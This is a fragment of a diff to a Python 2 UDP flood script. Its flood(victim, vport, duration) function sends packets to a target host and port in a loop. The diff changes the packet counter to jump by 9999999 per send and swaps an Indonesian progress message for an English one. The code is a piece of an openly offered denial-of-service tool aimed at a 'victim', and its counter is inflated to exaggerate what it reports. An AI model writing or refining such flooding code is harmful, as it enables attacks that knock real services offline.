@@ -34,8 +34,8 @@ def flood(victim, vport, duration):
         else:
             pass
         client.sendto(bytes, (victim, vport))
-        sent = sent + 99999
-        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+        sent = sent + 9999999
+        print "\033[1;91mSended \033[1;32m%s \033[1;91mPackets to host \033[1;32m%s \033[1;91mTo Port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
